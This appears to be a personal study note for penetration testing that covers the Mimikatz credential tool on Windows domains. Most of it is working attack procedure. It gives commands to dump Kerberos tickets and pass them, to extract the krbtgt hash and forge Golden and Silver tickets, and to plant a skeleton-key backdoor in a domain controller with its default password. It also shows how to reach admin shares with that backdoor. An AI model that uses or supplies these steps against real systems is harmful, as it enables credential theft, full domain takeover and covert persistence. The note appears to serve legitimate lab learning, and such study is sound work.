# Mimikatz
Github: https://github.com/gentilkiwi/mimikatz
WIki: https://github.com/gentilkiwi/mimikatz/wiki

Can extract plaintexts passwords, hash, PIN code and #Kerberos tickets from memory in #Windows systems.

Can perform the following attacks:
- Pass-the-Hash
- Pass-the-Ticket
- *Golden Tickets* / *Silver Tickets*


## Pass-the-Ticket
Run Mimikatz to start a session!

### Dump Tickets
*this can also be done with Rudeus*
1. Run `privilege::debug`, and ensure output is `'20' OK` indicating administrator privileges.
2. `sekurlsa::tickets/export` - will export all of the **.kirbi** tickets in the *current* directory. 

### Pass it!
1. `kerberos::ptt <ticket>` - run inside mimikatz w/ the ticket you harvested from earlier. It will cache and impersonate the given tacket. 
2. `klist`- verify successful impersonation with ticket by listing cached tickets
3. If successful you should have access to the related shares, which you can try and access, for example: `\\192.168.128\admin$`

*the above is only a PoC and is not a definitive guide in any shape or form*

## Golden/Silver Ticket Attacks
Attack to create Golden or Silver Tickets (see [[Kerberos#Golden Ticket Silver Ticket]])

**Creating & Using a Golden Ticket (Silver steps referenced)**
1. Ensure priv w/ `privilege::debug` == `Privilege '20' OK`
2. `lsadump::lsa /inject /name:krbtgt` - dump the **krbtgt** hash and SID needed for a Golden Ticket. 
	- To create **SILVER** ticket, change `/name:` to dump either hash of domain admin or a service account
3. `kerberos::golden /user:Administrator /domain:controller.local /sid:<SID> /krbtgt:<NTLM_HASH> /id:500`
	- Break down of command:
		- `kerberos::golden` - telling mimikatz we're doing a Golden ticket attack
		- `/user:Administrator` - we want a ticket for administrator
		- `/domain:controller.local` - the domain
		- `/sid:<SID>` - SID of **krbtgt**
		- `/krbtgt:<NTLM_HAHS>` - NTLM hash of **krbtgt**
		- `/id:500` - id for a domain admin
	- To create **SILVER** ticket, put a service NTLM hash into `/krbtgt:` slot, a SID of a service into `/sid:`, and change the `/id:` to `1103`
4. `misc::cmd` - will open a new elevated command prompt with the given ticket
	- Access machines and do what you want
	- Access will depend on the privileges of the user that you decided to take the ticket from
		- IF that user was **krbtgt** you have access to **ENTIRE** network, i.e. **Golden** Ticket. 
		- Anything else like a domain admin, will only provide access to what they have access to, hence **Silver** Ticket

## Backdoors and Skeleton Keys 
[[Kerberos#Skeleton Keys Backdoors]]
**Default Hash**: _60BA4FCADC466C7A033C178194C03DF6_
Which makes password: **mimikatz**

**DOES NOT PERSIST**
Implants a skeleton key in domain forest memory abusing AS-REQ validation of encrypted timestamps. Living in memory it will not persist in reboot. However it can be scripted or persisted using other tools/techniques. 

Obviously start by running `mimikatz`
1. Check for necessary priv: `privilege::debug` == `Privilege '20' OK`
2. Install skeleton key: `misc::skeleton`
3. Access the forest: `net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz`
	1. Share is now accessible without Administrator password, just default credential `mimikatz`

Add. Example:
`dir\\Desktop-1\c$ /user:Machine1 mimikatz` - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1


